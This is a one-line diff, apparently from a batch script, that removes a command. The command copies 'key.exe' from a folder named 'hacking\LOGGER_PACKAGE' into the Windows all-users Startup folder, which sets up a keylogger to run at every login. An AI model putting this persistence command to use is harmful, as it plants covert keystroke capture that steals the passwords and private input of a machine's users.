@@ -1,1 +1,0 @@
-xcopy E:\hacking\LOGGER_PACKAGE\key.exe C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\StartUp
